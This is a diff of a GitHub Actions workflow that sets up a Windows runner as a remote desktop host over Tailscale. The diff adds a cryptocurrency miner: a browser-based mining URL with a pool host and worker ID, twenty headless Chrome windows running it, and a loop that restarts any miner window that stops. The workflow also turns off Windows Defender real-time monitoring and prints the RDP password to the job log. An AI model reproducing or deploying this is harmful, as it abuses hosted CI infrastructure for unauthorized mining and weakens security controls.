@@ -1,17 +1,21 @@
-name: RDP
+name: RDP Auto-Recreate + Miner
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 */6 * * *"   # Run every 6 hours
+    - cron: "0 */6 * * *"  # كل 6 ساعات
 
 env:
   RDP_USER: "RDPUser"
-  MAX_RUNTIME: 340    # 5h40m
+  RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}
+  MAX_RUNTIME: 340       # 5h40m
+  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"
+  MINER_INSTANCES: 20    # عدد نوافذ Chrome
 
 jobs:
   rdp:
     runs-on: windows-latest
-    timeout-minutes: ${{ env.MAX_RUNTIME }}
+    timeout-minutes: 340
 
     steps:
       - name: Enable RDP
@@ -19,18 +23,9 @@ jobs:
           Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
-          # Performance tweaks
-          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "MaxInstanceCount" -Value 2
-          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxMonitors" -Value 4
-          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxXResolution" -Value 3840
-          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxYResolution" -Value 2160
-
-      - name: Create User
+      - name: Create RDP User
         run: |
-          $password = $env:RDP_PASSWORD
-          if (-not $password) { $password = "DefaultPass!234" }
-
-          $secure = ConvertTo-SecureString $password -AsPlainText -Force
+          $secure = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
 
           if (-not (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue)) {
             New-LocalUser -Name $env:RDP_USER -Password $secure -AccountNeverExpires
@@ -40,16 +35,13 @@ jobs:
             Set-LocalUser -Name $env:RDP_USER -Password $secure
           }
 
-          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
-        env:
-          RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}
+          Write-Host "✅ RDP User Ready: $env:RDP_USER"
 
       - name: Install Tailscale
         run: |
-          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
+          $ts = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
           $installer = "$env:TEMP\tailscale.msi"
-
-          Invoke-WebRequest $tsUrl -OutFile $installer
+          Invoke-WebRequest $ts -OutFile $installer
           Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait
           Remove-Item $installer
 
@@ -58,10 +50,9 @@ jobs:
           Start-Service Tailscale
           Start-Sleep -Seconds 5
           & "$env:ProgramFiles\Tailscale\tailscale.exe" up --reset --authkey ${{ secrets.TAILSCALE_AUTH_KEY }} --hostname "GH-RDP-${{ github.run_id }}"
-
           $ip = (& "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4)
           echo "TS_IP=$ip" >> $env:GITHUB_ENV
-          Write-Host "Tailscale IP: $ip"
+          Write-Host "✅ Tailscale IP: $ip"
 
       - name: Optimize Windows
         run: |
@@ -71,25 +62,56 @@ jobs:
           powercfg /setactive SCHEME_MIN
           Set-MpPreference -DisableRealtimeMonitoring $true
 
-      - name: Show RDP Info
+      - name: Launch Miner Windows
+        run: |
+          $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+          if (-not (Test-Path $chromePath)) {
+              Write-Host "❌ Chrome not installed"
+              exit 1
+          }
+
+          for ($i=1; $i -le $env:MINER_INSTANCES; $i++) {
+              Start-Process $chromePath -ArgumentList "--headless --disable-gpu --no-sandbox --remote-debugging-port=$((9222 + $i)) --kiosk $env:MINER_URL"
+              Write-Host "✅ Launched Miner Window $i"
+          }
+
+      - name: Monitor Miner & Keep Alive
+        run: |
+          $totalMinutes = [int]$env:MAX_RUNTIME
+          $checkInterval = 1
+
+          for ($elapsed=0; $elapsed -lt $totalMinutes; $elapsed += $checkInterval) {
+              Write-Host "⏱ RDP Session Active - Minute $elapsed / $totalMinutes"
+
+              # تحقق من النوافذ وإعادة تشغيل أي نافذة توقفت
+              $chromeProcesses = Get-Process chrome -ErrorAction SilentlyContinue
+              if ($chromeProcesses.Count -lt $env:MINER_INSTANCES) {
+                  $missing = $env:MINER_INSTANCES - $chromeProcesses.Count
+                  Write-Host "⚠ $missing Chrome windows missing, restarting..."
+                  for ($j=1; $j -le $missing; $j++) {
+                      Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "--headless --disable-gpu --no-sandbox --remote-debugging-port=$((9222 + $j)) --kiosk $env:MINER_URL"
+                  }
+              }
+
+              Start-Sleep -Seconds ($checkInterval * 60)
+          }
+
+      - name: Display RDP Info
         run: |
           Write-Host "==========================================="
-          Write-Host "🚀 RDP READY"
+          Write-Host "🚀 RDP + Miner Ready"
           Write-Host "IP: $env:TS_IP"
           Write-Host "User: $env:RDP_USER"
           Write-Host "Pass: $env:RDP_PASSWORD"
           Write-Host "Duration: $env:MAX_RUNTIME min"
+          Write-Host "Chrome Windows: $env:MINER_INSTANCES"
+          Write-Host "URL: $env:MINER_URL"
           Write-Host "==========================================="
-
-      - name: Keep Alive
-        run: |
-          for ($i=0; $i -lt $env:MAX_RUNTIME; $i++) {
-            Write-Host "RDP Session Active... $i / $env:MAX_RUNTIME min"
-            Start-Sleep -Seconds 60
-          }
 
       - name: Cleanup
         if: always()
         run: |
+          Write-Host "🧹 Cleaning up..."
+          Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
           & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
-          Write-Host "Cleanup completed."
+          Write-Host "✅ Cleanup Completed"
